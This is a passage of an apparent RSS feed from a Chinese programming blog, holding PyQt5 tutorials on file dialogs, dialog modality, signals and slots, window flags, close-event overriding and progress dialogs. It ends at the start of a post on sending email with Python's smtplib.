&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getOpenFileName(myWin, directory&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Excel files(*.xlsx ; *.xls)&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#-------------------------------------------------------------------&lt;/span&gt;
第一个参数: parent 用于指定父组件,PS: 很多Qt组件的构造函数都会有这么一个parent参数,并提供一个默认值0
第二个参数: caption 是对话框的标题
第三个参数: dir 是对话框显示时默认打开的目录,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt; 代表程序运行目录,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; 代表当前盘符的根目录
第四个参数: filter 是对话框的后缀名过滤器,支持正则
第六个参数: options,是对话框的一些参数设定,比如只显示文件夹等 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4获取多文件路径实例&#34;&gt;4.获取多文件路径实例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;QFileDialog&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getOpenFileNames(&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请选择要添加的文件&amp;#34;&lt;/span&gt;, path, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Text Files (*.xls;*.xlsx);;All Files (*)&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;#-----------------------------------------------------------&lt;/span&gt;
第四个参数,列出可以进行筛选的参数,第一个是默认的,多个用双分号分开
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—QDialog 消息提示类</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qdialog-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E7%B1%BB/</link>
        <pubDate>Sat, 19 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qdialog-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E7%B1%BB/</guid>
        <description>&lt;h2 id=&#34;1qdialog的子类&#34;&gt;1.QDialog的子类&lt;/h2&gt;
&lt;p&gt;QMessageBox，QFileDialog，QColorDialog，QFontDialog，QInputDialog等&lt;/p&gt;
&lt;h2 id=&#34;2qdialog类中的常用方法&#34;&gt;2.QDialog类中的常用方法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setWindowTitle()  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置对话框标题&lt;/span&gt;
setWindowModality()  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置窗口模态&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#-值-----------------------------------------------&lt;/span&gt;
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NonModal: 非模态,可以和程序的其他窗口进行交互
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowModal: 窗口模态,程序在未处理玩当前对话框时,将阻止和对话框的父窗口进行交互
Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ApplicationModal: 应用程序模态,阻止和任何其他窗口进行交互
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—信号和槽</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD/</link>
        <pubDate>Fri, 18 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD/</guid>
        <description>&lt;h2 id=&#34;1概述&#34;&gt;1.概述&lt;/h2&gt;
&lt;p&gt;信号和槽机制是 QT 的核心机制，其是一种高级接口，应用于对象之间的通信，它是 QT 的核心特性，也是 QT 区别于其它工具包的重要地方。信号和槽是 QT 自行定义的一种通信机制，它独立于标准的 C/C++ 语言，因此要正确的处理信号和槽，必须借助一个称为moc(Meta Object Compiler)的 QT 工具，该工具是一个 C++ 预处理程序，它为高层次的事件处理自动生成所需要的附加代码。&lt;/p&gt;
&lt;p&gt;在其它的 GUI 工具包中，窗口部件 (widget) 都有一个回调函数用于响应它们能触发的每个动作，这个回调函数通常是一个指向某个函数的指针。在 QT 中信号和槽取代了这些凌乱的函数指针，使得我们编写这些通信程序更为简洁明了。信号和槽能携带任意数量和任意类型的参数，且其的类型是完全安全的，不会像回调函数那样产生 core dumps。&lt;/p&gt;
&lt;p&gt;所有从 QObject 或其子类 ( 例如 Qwidget ）派生的类都能够包含信号和槽。当对象改变其状态时，信号就由该对象发射 (emit) 出去，这就是对象所要做的全部事情，它不需要知道另一端是谁在接收这个信号。这也就是真正的信息封装，它确保对象被当作一个真正的软件组件来使用。槽用于接收信号，主要是普通的对象成员函数，同样的一个槽并不知道是否有任何信号与自己相连接。&lt;/p&gt;
&lt;h2 id=&#34;2信号与槽的关联&#34;&gt;2.信号与槽的关联&lt;/h2&gt;
&lt;p&gt;通过调用 QObject 对象的 connect 函数来将某个对象的信号与另外一个对象的槽函数相关联，这样当发射者发射信号时，接收者的槽函数将被调用。该函数的定义如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; QObject&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;connect( &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; QObject &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; sender, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; signal, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; QObject &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; receiver, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; member ) [&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;connect 函数将信号发送者 sender 对象中的信号 signal 与接受者 receiver 中的 member 槽函数联系起来。注意的是，当指定信号 signal时必须使用宏SIGNAL，当指定槽函数时必须使用宏SLOT。&lt;/p&gt;
&lt;p&gt;例如，下面定义了两个对象：标签对象 label 和滚动条对象 scroll，并将 valueChanged() 信号与标签对象的 setNum() 相关联，另外信号还携带了一个整形参数，这样标签总是显示滚动条所处位置的值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;QLabel  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;label  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; QLabel; 
QScrollBar  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;scroll &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; QScrollBar; 
QObject&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;connect( scroll, SIGNAL(valueChanged(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)), label,  SLOT(setNum(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)) );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当信号与槽没有必要继续保持关联时，我们可以使用 disconnect 函数来断开发射者中的信号与接收者中的槽函数之间的关联。其定义如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; QObject&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;disconnect( &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; QObject &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; sender, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; signal, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; Object &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; receiver, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; member ) [&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—最大最小关闭按钮的隐藏</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%85%B3%E9%97%AD%E6%8C%89%E9%92%AE%E7%9A%84%E9%9A%90%E8%97%8F/</link>
        <pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%85%B3%E9%97%AD%E6%8C%89%E9%92%AE%E7%9A%84%E9%9A%90%E8%97%8F/</guid>
        <description>&lt;h2 id=&#34;1示例代码&#34;&gt;1.示例代码&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 1、直接隐藏界面整个头部内容&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FramelessWindowHint)

&lt;span style=&#34;color:#75715e&#34;&gt;# 2、显示最小化按钮&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowMinimizeButtonHint)

&lt;span style=&#34;color:#75715e&#34;&gt;# 3、显示最大化按钮&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowMaximizeButtonHint)

&lt;span style=&#34;color:#75715e&#34;&gt;# 4、显示最小化和最大化按钮&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowMinMaxButtonsHint)

&lt;span style=&#34;color:#75715e&#34;&gt;# 5、显示关闭按钮&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowCloseButtonHint)

&lt;span style=&#34;color:#75715e&#34;&gt;# 6、固定界面大小尺寸，不能进行缩放（三种方法都可以）&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MSWindowsFixedSizeDialogHint)
setFixedSize(width, height)
setMinimumSize(&lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;700&lt;/span&gt;)   setMaximumSize(&lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;700&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 7、取消最小化和最大化，及关闭按钮（利用固定大小方法）&lt;/span&gt;
setWindowFlags(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowMaximizeButtonHint &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MSWindowsFixedSizeDialogHint)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—退出事件的重写</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5%E9%80%80%E5%87%BA%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%87%8D%E5%86%99/</link>
        <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5%E9%80%80%E5%87%BA%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%87%8D%E5%86%99/</guid>
        <description>&lt;h2 id=&#34;1示例&#34;&gt;1.示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PyQt5 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; QtWidgets
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; PyQt5.QtGui &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; QFont
&lt;span style=&#34;color:#75715e&#34;&gt;# QtWidgets 不包含 QFont 必须调用 QtGui&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MessageBox&lt;/span&gt;(QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QWidget):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self,parent &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
        &lt;span style=&#34;color:#75715e&#34;&gt;# parent = None 代表此 QWidget 属于最上层的窗口,也就是 MainWindows.&lt;/span&gt;
        QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QWidget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__(self)
        &lt;span style=&#34;color:#75715e&#34;&gt;# 因为继承关系，要对父类初始化&lt;/span&gt;
        &lt;span style=&#34;color:#75715e&#34;&gt;# 通过 super 初始化父类，__init__() 函数无 self，若直接 QtWidgets.QWidget.__init__(self)，括号里是有self的&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setGeometry(&lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)  
        &lt;span style=&#34;color:#75715e&#34;&gt;# setGeometry() 设置窗口在屏幕上的位置和设置窗口本身的大小。它的前两个参数是窗口在屏幕上的 x 和 y 坐标。后两个参数是窗口本身的宽和高&lt;/span&gt;
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setToolTip(&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;b&amp;gt;程序&amp;lt;/b&amp;gt;提示&amp;#39;&lt;/span&gt;) 
        &lt;span style=&#34;color:#75715e&#34;&gt;# 调用 setToolTip() 方法,该方法接受富文本格式的参数,css 之类。&lt;/span&gt;
        QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QToolTip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setFont(QFont(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;华文楷体&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)) 
        &lt;span style=&#34;color:#75715e&#34;&gt;# 设置字体以及字体大小&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 当我们关闭一个窗口时，在 PyQt 中就会触发一个 QCloseEvent 的事件，正常情况下会直接关闭这个窗口，&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 但是我们不希望这样的事情发生，所以我们需要重新定义 QCloseEvent，函数名称为 closeEvent 不可变&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#--------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;closeEvent&lt;/span&gt;(self,event):
        &lt;span style=&#34;color:#75715e&#34;&gt;# 函数名固定不可变&lt;/span&gt;
        reply&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;question(self,&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;警告&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;确认退出?&amp;#39;&lt;/span&gt;,QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes,QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;No)
        &lt;span style=&#34;color:#75715e&#34;&gt;# QtWidgets.QMessageBox.question(self,u&amp;#39;弹窗名&amp;#39;,u&amp;#39;弹窗内容&amp;#39;,选项1,选项2)&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; reply&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Yes:
            event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;accept()
            &lt;span style=&#34;color:#75715e&#34;&gt;# 关闭窗口&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            event&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ignore()
            &lt;span style=&#34;color:#75715e&#34;&gt;# 忽视点击 X 事件&lt;/span&gt;

app&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;QtWidgets&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;QApplication(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv)
window&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;MessageBox()
window&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(app&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exec_())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>PyQt5—QProgressDialog 进度条</title>
        <link>https://ac-lm.github.io/posts/pyqt5/pyqt5qprogressdialog-%E8%BF%9B%E5%BA%A6%E6%9D%A1/</link>
        <pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pyqt5/pyqt5qprogressdialog-%E8%BF%9B%E5%BA%A6%E6%9D%A1/</guid>
        <description>&lt;h2 id=&#34;1qprogressdialog&#34;&gt;1.QProgressDialog&lt;/h2&gt;
&lt;p&gt;进度条使用 steps 的概念。在指定最小和最大可能的 step 值后，它将显示已经完成的 step 的百分比。百分比是通过将进度&lt;code&gt;(value() - minimum()) / (maximum() - minimum())&lt;/code&gt;来计算的。&lt;/p&gt;
&lt;p&gt;可以使用 setMinimum() 和 setMaximum() 指定最小和最大 steps。默认值是0和99。当前的 step 由 setValue() 设置。进度条可以通过 reset() 重新开始。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果最小值和最大值都设置为 0，那么栏会显示一个繁忙的指示符，而不是步骤的百分比&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;2常用方法&#34;&gt;2.常用方法&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;setMinimum()  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置操作中的 steps 数量&lt;/span&gt;
setMaximum()  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置操作中的 steps 数量&lt;/span&gt;
setValue()  &lt;span style=&#34;color:#75715e&#34;&gt;# 任意选择步数&lt;/span&gt;
setAutoReset()  &lt;span style=&#34;color:#75715e&#34;&gt;# 自动重置&lt;/span&gt;
setAutoClose()  &lt;span style=&#34;color:#75715e&#34;&gt;# 自动关闭&lt;/span&gt;
setRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,num)  &lt;span style=&#34;color:#75715e&#34;&gt;# 设置最小和最大值&lt;/span&gt;
wasCanceled()  &lt;span style=&#34;color:#75715e&#34;&gt;# 是否按下取消按钮&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3实例&#34;&gt;3.实例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;showDialog&lt;/span&gt;(self):
    num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;edit&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text())
    progress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; QProgressDialog(self)
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setWindowTitle(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请稍等&amp;#34;&lt;/span&gt;)  
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setLabelText(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;正在操作...&amp;#34;&lt;/span&gt;)
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setCancelButtonText(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;取消&amp;#34;&lt;/span&gt;)
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setMinimumDuration(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setWindowModality(Qt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WindowModal)
    progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,num) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(num):
        progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setValue(i) 
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;wasCanceled():
            QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warning(self,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;提示&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;操作失败&amp;#34;&lt;/span&gt;) 
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            progress&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setValue(num)
            QMessageBox&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;information(self,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;提示&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;操作成功&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—邮件发送</title>
        <link>https://ac-lm.github.io/posts/python/python%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81/</link>
        <pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81/</guid>
        <description>&lt;h2 id=&#34;1发送简单邮件&#34;&gt;1.发送简单邮件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; smtplib
&lt;span style=&#34;color:#75715e&#34;&gt;#发送字符串的邮件&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.text &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEText
&lt;span style=&#34;color:#75715e&#34;&gt;#处理多种形态的邮件主体我们需要 MIMEMultipart 类&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.multipart &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEMultipart
&lt;span style=&#34;color:#75715e&#34;&gt;#处理图片需要 MIMEImage 类&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; email.mime.image &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MIMEImage
 
&lt;span style=&#34;color:#75715e&#34;&gt;# qq邮箱smtp服务器&lt;/span&gt;
host_server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;smtp.qq.com&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# sender_qq为发件人的qq号码&lt;/span&gt;
sender_qq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;13VVVVVVVV@qq.com&amp;#39;&lt;/span&gt;
